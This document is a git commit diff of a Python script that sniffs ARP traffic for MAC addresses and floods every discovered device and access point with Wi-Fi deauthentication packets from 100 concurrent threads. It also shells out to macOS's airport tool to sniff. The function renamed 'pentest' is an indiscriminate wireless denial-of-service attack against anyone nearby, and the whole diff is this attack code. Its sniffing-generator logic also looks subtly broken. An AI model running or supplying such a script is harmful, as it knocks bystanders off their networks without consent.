98e9ae4b936e23d8145a5128121087c082f52d45
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-25 19:09:38 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -1,11 +1,14 @@
+import os
 import concurrent.futures
 import netifaces as ni
 import socket
 import time
 from scapy.all import *
 
+def enable_monitor_mode(interface):
+    os.system(f"sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport {interface} sniff -c1")
 
-def die(target_mac, access_point_mac):
+def deauth(target_mac, access_point_mac):
     interface = "en0"
     packet_count = 100
     interval = 0.1
@@ -17,21 +20,29 @@ def die(target_mac, access_point_mac):
     )
     sendp(pkt, inter=interval, count=packet_count, verbose=0)
 
-
-def maccy():
+def monitor_arp_packets():
     def packet_handler(pkt):
         if ARP in pkt and pkt[ARP].op in (1, 2):  # who-has or is-at
-            mac_address = pkt[Ether].src
-            yield mac_address
+            yield pkt[Ether].src
+            yield pkt[Ether].dst
 
     sniff(prn=packet_handler, filter="arp", store=0)
 
+def pentest():
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        for wifi in monitor_arp_packets():
+            for device in monitor_arp_packets():
+                try:
+                    executor.submit(deauth, device, wifi)
+                except Exception as e:
+                    time.sleep(60)
+                    executor.submit(deauth, device, wifi)
 
-with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
-    for wifi in maccy():
-        for device in maccy():
-            try:
-                executor.submit(die, device, wifi)
-            except Exception as e:
-                time.sleep(60)
-                executor.submit(die, device, wifi)
+# Set your network interface here
+interface = "en0"
+
+# Enable monitor mode on the interface
+enable_monitor_mode(interface)
+
+# Start the pentesting process
+pentest()
